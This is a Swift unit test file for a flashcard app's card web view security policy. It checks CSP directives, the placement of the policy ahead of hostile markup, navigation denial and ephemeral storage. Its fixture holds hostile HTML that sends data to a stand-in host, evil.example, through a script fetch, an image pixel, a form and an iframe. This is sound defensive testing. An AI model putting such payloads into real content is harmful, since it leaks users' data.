// Copyright: Ankitects Pty Ltd and contributors
// License: GNU AGPL, version 3 or later; http://www.gnu.org/licenses/agpl.html

import WebKit
import XCTest
@testable import BrainliftMobile

@MainActor
final class CardWebSecurityPolicyTests: XCTestCase {
    func testContentSecurityPolicyBlocksCardExfiltrationChannels() {
        let directives = CardWebSecurityPolicy.contentSecurityPolicy
            .split(separator: ";")
            .map { $0.trimmingCharacters(in: .whitespaces) }

        XCTAssertTrue(directives.contains("default-src 'none'"))
        XCTAssertTrue(directives.contains("connect-src 'none'"))
        XCTAssertTrue(directives.contains("form-action 'none'"))
        XCTAssertTrue(directives.contains("frame-src 'none'"))
        XCTAssertTrue(directives.contains("object-src 'none'"))
        XCTAssertTrue(directives.contains("base-uri 'none'"))
        XCTAssertTrue(directives.contains("img-src data: blob: file:"))
        XCTAssertTrue(directives.contains("media-src data: blob: file:"))
        XCTAssertFalse(
            CardWebSecurityPolicy.contentSecurityPolicy.contains("http:")
        )
        XCTAssertFalse(
            CardWebSecurityPolicy.contentSecurityPolicy.contains("https:")
        )
    }

    func testSecuredHTMLInstallsPolicyBeforeMaliciousCardMarkup() throws {
        let hostileHTML = """
        <!doctype html><html><head>
        <script>fetch("https://evil.example/secret")</script>
        <img src="https://evil.example/pixel">
        </head><body>
        <form action="https://evil.example/form"><input name="secret"></form>
        <iframe src="https://evil.example/frame"></iframe>
        </body></html>
        """

        let securedHTML = CardWebSecurityPolicy.securedHTML(hostileHTML)
        let policyLocation = try XCTUnwrap(
            securedHTML.range(of: "Content-Security-Policy")
        )
        let hostileLocation = try XCTUnwrap(
            securedHTML.range(of: "https://evil.example")
        )

        XCTAssertLessThan(policyLocation.lowerBound, hostileLocation.lowerBound)
        XCTAssertTrue(
            securedHTML.contains(
                "content=\"\(CardWebSecurityPolicy.contentSecurityPolicy)\""
            )
        )
    }

    func testTopLevelRemoteLinkAndFormNavigationAreDenied() {
        let remote = URL(string: "https://evil.example/collect")!

        XCTAssertFalse(
            CardWebSecurityPolicy.allowsTopLevelNavigation(
                to: remote,
                navigationType: .other
            )
        )
        XCTAssertFalse(
            CardWebSecurityPolicy.allowsTopLevelNavigation(
                to: remote,
                navigationType: .linkActivated
            )
        )
        XCTAssertFalse(
            CardWebSecurityPolicy.allowsTopLevelNavigation(
                to: URL(string: "data:text/html,safe"),
                navigationType: .formSubmitted
            )
        )
    }

    func testOnlyPassiveLocalTopLevelDocumentsAreAllowed() {
        XCTAssertTrue(
            CardWebSecurityPolicy.allowsTopLevelNavigation(
                to: URL(string: "about:blank"),
                navigationType: .other
            )
        )
        XCTAssertTrue(
            CardWebSecurityPolicy.allowsTopLevelNavigation(
                to: URL(string: "data:text/html,card"),
                navigationType: .other
            )
        )
        XCTAssertFalse(
            CardWebSecurityPolicy.allowsTopLevelNavigation(
                to: URL(string: "anki://open"),
                navigationType: .other
            )
        )
    }

    func testConfigurationUsesEphemeralStorageAndDisablesPopups() {
        let configuration = CardWebSecurityPolicy.makeConfiguration()

        XCTAssertFalse(configuration.websiteDataStore.isPersistent)
        XCTAssertFalse(
            configuration.preferences.javaScriptCanOpenWindowsAutomatically
        )
    }
}
